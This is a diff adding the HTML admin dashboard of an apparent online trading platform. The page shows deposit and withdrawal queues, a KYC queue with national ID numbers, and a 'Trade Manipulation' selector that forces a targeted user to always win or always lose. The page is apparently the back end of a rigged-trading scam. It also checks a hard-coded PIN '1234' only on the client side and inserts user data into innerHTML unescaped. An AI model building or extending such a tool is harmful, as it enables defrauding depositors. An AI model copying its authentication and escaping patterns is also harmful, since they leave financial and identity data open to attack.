@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PRO-TRADE Master Admin</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+    body { background: #0b0e14; color: white; padding: 20px; }
+    .card { background: #161c28; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #222b3d; }
+    h2 { color: #00e676; margin-bottom: 15px; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 20px; }
+    .stat { background: #0b0e14; padding: 12px; border-radius: 8px; text-align: center; }
+    .val { font-size: 18px; font-weight: bold; color: #00e676; margin-top: 5px; }
+    select, button { padding: 10px; border-radius: 6px; border: 1px solid #222b3d; background: #0b0e14; color: white; outline: none; }
+    .btn-approve { background: #00c853; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
+    .btn-reject { background: #ff1744; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
+    .queue-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #0b0e14; margin-bottom: 8px; border-radius: 6px; font-size: 13px; }
+  </style>
+</head>
+<body>
+
+  <div id="login-box" class="card" style="max-width: 380px; margin: 80px auto;">
+    <h2>Admin Master Access</h2>
+    <input type="password" id="pin" placeholder="Enter Security PIN" style="width: 100%; padding: 12px; margin-bottom: 15px; background: #0b0e14; border: 1px solid #222b3d; color: white; border-radius: 6px;">
+    <button onclick="login()" style="width: 100%; background: #00e676; color: black; font-weight: bold; cursor: pointer; border: none;">Login Dashboard</button>
+  </div>
+
+  <div id="dashboard" style="display: none;">
+    <div class="card">
+      <h2>Financial Reports</h2>
+      <div class="grid">
+        <div class="stat">1h Deposit<div class="val" id="d-1h-dep">$0.00</div></div>
+        <div class="stat">1h Withdraw<div class="val" style="color:#ff1744;" id="d-1h-with">$0.00</div></div>
+        <div class="stat">24h Deposit<div class="val" id="d-24h-dep">$0.00</div></div>
+        <div class="stat">24h Net Profit<div class="val" id="d-24h-profit">$0.00</div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Target User Trade Manipulation Strategy</h2>
+      <div style="display: flex; gap: 10px; align-items: center;">
+        <span style="font-size: 14px;">User Strategy:</span>
+        <select id="user-mode" onchange="setMode()">
+          <option value="AUTO">AUTO (Natural System Algorithm)</option>
+          <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
+          <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Pending Deposit & Withdrawal Queue</h2>
+      <div id="queue-list"></div>
+    </div>
+
+    <div class="card">
+      <h2>Pending KYC Documents Queue</h2>
+      <div id="kyc-list"></div>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const ADMIN_PIN = "1234";
+
+    function login() {
+      if (document.getElementById('pin').value === ADMIN_PIN) {
+        document.getElementById('login-box').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        loadData();
+      } else {
+        alert("Incorrect Security PIN!");
+      }
+    }
+
+    function loadData() {
+      fetch('/api/admin/data')
+        .then(r => r.json())
+        .then(data => {
+          document.getElementById('d-1h-dep').innerText = '$' + data.stats.dep1h;
+          document.getElementById('d-1h-with').innerText = '$' + data.stats.with1h;
+          document.getElementById('d-24h-dep').innerText = '$' + data.stats.dep24h;
+          document.getElementById('d-24h-profit').innerText = '$' + data.stats.profit24h;
+
+          let html = '';
+          data.pendingDeposits.forEach(d => {
+            html += `<div class="queue-row">
+              <span>DEP: $${d.amount} (≈${d.bdtAmount} BDT) - TRX: ${d.trxId}</span>
+              <div>
+                <button class="btn-approve" onclick="action('${d.id}', 'DEPOSIT', 'APPROVE')">Approve</button>
+                <button class="btn-reject" onclick="action('${d.id}', 'DEPOSIT', 'REJECT')">Reject</button>
+              </div>
+            </div>`;
+          });
+
+          data.pendingWithdrawals.forEach(w => {
+            html += `<div class="queue-row">
+              <span>WITH: $${w.amount} (≈${w.bdtAmount} BDT) - ACC: ${w.accountNo}</span>
+              <div>
+                <button class="btn-approve" onclick="action('${w.id}', 'WITHDRAWAL', 'APPROVE')">Approve</button>
+                <button class="btn-reject" onclick="action('${w.id}', 'WITHDRAWAL', 'REJECT')">Reject</button>
+              </div>
+            </div>`;
+          });
+
+          document.getElementById('queue-list').innerHTML = html || 'No pending financial requests';
+
+          let kycHtml = '';
+          data.pendingKYCs.forEach(k => {
+            kycHtml += `<div class="queue-row">
+              <span>KYC: ${k.name} - NID: ${k.nidNumber}</span>
+              <div><button class="btn-approve">Approve KYC</button></div>
+            </div>`;
+          });
+          document.getElementById('kyc-list').innerHTML = kycHtml || 'No pending KYC submissions';
+        });
+    }
+
+    function action(id, type, act) {
+      fetch('/api/admin/action', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ id, type, action: act })
+      }).then(() => loadData());
+    }
+
+    function setMode() {
+      socket.emit('admin_set_user_mode', { userId: "USER_101", mode: document.getElementById('user-mode').value });
+    }
+  </script>
+</body>
+</html>
